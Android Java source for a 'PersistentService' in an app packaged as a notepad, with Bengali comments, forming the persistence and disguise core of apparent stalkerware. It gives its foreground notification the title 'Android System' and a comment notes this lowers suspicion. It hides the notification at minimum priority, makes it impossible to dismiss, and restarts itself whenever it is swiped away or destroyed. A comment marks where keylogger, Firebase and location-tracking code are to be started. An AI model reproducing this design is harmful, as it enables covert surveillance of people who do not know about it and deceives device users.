package com.megh.notepad; // 🌟 আপনার সঠিক প্যাকেজ নেম 🌟

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import android.util.Log;

public class PersistentService extends Service {

    private static final String CHANNEL_ID = "ParentalControlChannel";

    @Override
    public void onCreate() {
        super.onCreate();
        // সার্ভিস চালু হওয়ার সাথে সাথে নোটিফিকেশন তৈরি করা
        createNotificationChannel();
        startForeground(1, getNotification());
        
        // 🌟 এখানে আপনার ফায়ারবেস লিসেনার, কীলগার বা লোকেশন ট্র্যাকিং এর কোড চালু করবেন 🌟
        Log.d("PersistentService", "সার্ভিস চালু হয়েছে!");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // START_STICKY সিস্টেমকে বলে দেয় যে, মেমোরি ক্লিয়ার করে সার্ভিসটি বন্ধ করলেও সিস্টেম যেন সুযোগ পেলেই এটি আবার রিস্টার্ট করে।
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // আমরা Bound Service ব্যবহার করছি না
    }

    // ইউজার যদি রিসেন্ট অ্যাপস (Recent Apps) থেকে অ্যাপটি সোয়াইপ করে কেটে দেয়
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d("PersistentService", "অ্যাপ রিসেন্ট থেকে রিমুভ করা হয়েছে। রিস্টার্ট ব্রডকাস্ট পাঠানো হচ্ছে...");
        sendRestartBroadcast();
    }

    // যদি সিস্টেম কোনো কারণে সার্ভিসটি ডেস্ট্রয় করে দেয়
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d("PersistentService", "সার্ভিস ডেস্ট্রয় হয়েছে। রিস্টার্ট ব্রডকাস্ট পাঠানো হচ্ছে...");
        sendRestartBroadcast();
    }

    // সার্ভিস আবার চালু করার জন্য ব্রডকাস্ট পাঠানো
    private void sendRestartBroadcast() {
        Intent broadcastIntent = new Intent(this, RestartReceiver.class);
        broadcastIntent.setAction("com.megh.notepad.RESTART_SERVICE");
        sendBroadcast(broadcastIntent);
    }

    // Foreground Service এর জন্য নোটিফিকেশন (Android 8+)
    private Notification getNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Android System") // সিস্টেমের মত নাম দিলে সন্দেহ কম হবে
                .setContentText("System services are running perfectly.")
                // .setSmallIcon(R.drawable.ic_transparent) // একটি স্বচ্ছ বা সিস্টেমের মত আইকন দিন
                .setPriority(NotificationCompat.PRIORITY_MIN) // মিনিমাম প্রায়োরিটি দিলে সাউন্ড হবে না
                .setOngoing(true); // নোটিফিকেশনটি ক্লিয়ার করা যাবে না

        return builder.build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Background Task",
                    NotificationManager.IMPORTANCE_MIN
            );
            serviceChannel.setDescription("Required for system background tasks.");
            serviceChannel.setShowBadge(false); // আইকনে ব্যাজ দেখাবে না
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }
}